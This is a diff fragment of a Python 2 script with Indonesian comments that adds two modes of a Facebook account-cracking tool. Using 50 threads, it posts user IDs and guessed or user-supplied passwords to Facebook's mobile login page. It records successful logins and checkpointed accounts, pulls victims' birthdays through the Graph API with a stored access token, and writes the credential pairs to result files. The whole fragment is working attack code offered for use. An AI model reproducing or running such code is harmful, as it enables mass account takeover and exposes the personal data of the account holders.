+				# ini ua random tinggal pasang saja user agent yg paling joss di perangkat mu
+				ua = random.choice(['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36'])
+				aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
+				xo = aw.content
+				if 'mbasic_logout_button' in xo or 'save-device' in xo:
+					print '\r  %s* --> %s|%s                 %s' % (H,uid,pw,N)
+					wrt = ' [✓] %s|%s' % (uid,pw)
+					ok.append(wrt)
+					open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+					break
+					continue					
+				if 'checkpoint' in xo:
+					try:
+						__cindy__ = open('__yayan__.txt').read()
+						ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(uid,__cindy__))
+						az = json.loads(ak.text)
+						ttl= az['birthday'].replace('/','-')
+						print '\r  %s* --> %s|%s|%s     %s' % (K,uid,pw,ttl,N)
+						wrt = ' [×] %s|%s|%s' % (uid,pw,ttl)
+						cp.append(wrt)
+						open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+						break
+					except(KeyError, IOError):
+						ttl = ' '
+					except:pass
+					print '\r  %s* --> %s|%s                %s' % (K,uid,pw,N)
+					wrt = ' [×] %s|%s' % (uid,pw)
+					cp.append(wrt)
+					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+					break
+					continue
+					
+			loop += 1
+		except:
+			pass
+	p = ThreadPool(50)
+	p.map(main, id)
+	print '\n %s[%s✓%s] Proses Intip by ROY Selesai...'%(N,K,N)
+	lagi = raw_input('\n %s[%s*%s] Crack Lagi? Y/t : %s'%(N,O,N,H))
+	if lagi in ('Y', 'y'):
+		crack_random()
+	elif lagi in ('T', 't'):
+		print '\n %sselamat tinggal :) '%(N)
+	else:
+		exit()
+def manual():
+	print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
+	pw = raw_input('\n [%s?%s] masukan kata sandi : '%(O,N))
+	print ' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pw, N)
+	print ('')
+	if len(pw) ==0:
+		print '\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N)
+	print ' %s=================================================='%(N)
+	print ' [%s✓%s] Hasil %sOK%s ke : %sresults/OK-%s-%s-%s.txt%s' % (H,N,H,N,K,ha, op, ta,N)
+	print ' [%s✓%s] Hasil %sCP%s ke : %sresults/CP-%s-%s-%s.txt%s' % (K,N,K,N,K,ha, op, ta,N)
+	print ' %s=================================================='%(N)
+	print ' [%s!%s] %sMatikan data selular untuk menjeda proses'%(M,N,M)
+	print ' %s==================================================\n'%(N)
+
+	def main(user):
+		global ok,cp,ttl,loop
+		#sys.stdout.write('\r \033[0;97m[\033[0;93m*\033[0;97m] Crack %s/OK:%s CP:%s ' % (loop, len(ok), len(cp))
+		sys.stdout.write('\r %s[%s%s%s]' %(N,O,loop,N)
+		); sys.stdout.flush()
+		try:os.mkdir("results")
+		except OSError:pass
+		uid,name=user.split("[-]")
+		ss = name.split(" ")
+		try:
+			os.mkdir('results')
+		except OSError:
+			pass
+		try:
+			for asu in pw.split(","):
+				# ini ua random tinggal pasang saja user agent yg paling joss di perangkat mu
+				ua = 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)'
+				aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
+				xo = aw.content
+				if 'mbasic_logout_button' in xo or 'save-device' in xo:
+					print '\r  %s* --> %s|%s                 %s' % (H,uid,pw,N)
+					wrt = ' [✓] %s|%s' % (uid,pw)
+					ok.append(wrt)
+					open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+					break
+					continue
+				if 'checkpoint' in xo:
+					try:
+						__cindy__ = open('__yayan__.txt').read()
+						ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(uid,__cindy__))
+						az = json.loads(ak.text)
+						ttl= az['birthday'].replace('/','-')
+						print '\r  %s* --> %s|%s|%s     %s' % (K,uid,pw,ttl,N)
+						wrt = ' [×] %s|%s|%s' % (uid,pw,ttl)
+						cp.append(wrt)
+						open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+						break
+					except(KeyError, IOError):
+						ttl = ' '
+					except:pass
+					print '\r  %s* --> %s|%s                %s' % (K,uid,pw,N)
+					wrt = ' [×] %s|%s' % (uid,pw)
+					cp.append(wrt)
+					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+					break
+					continue
+			
+			loop += 1
+		except:
+			pass
+	p = ThreadPool(50)
+	p.map(main, id)
+	print '\n %s[%s✓%s] Proses Intip by ROY Selesai...'%(N,K,N)
+	lagi = raw_input('\n %s[%s*%s] Crack Lagi? Y/t : %s'%(N,O,N,H))
+	if lagi in ('Y', 'y'):
+		manual()
+	elif lagi in ('T', 't'):
+		print '\n %sselamat tinggal :) '%(N)
+	else:
+		exit()
 # mulai ngecrot awokawokawokkawok
 class __crack__:
 
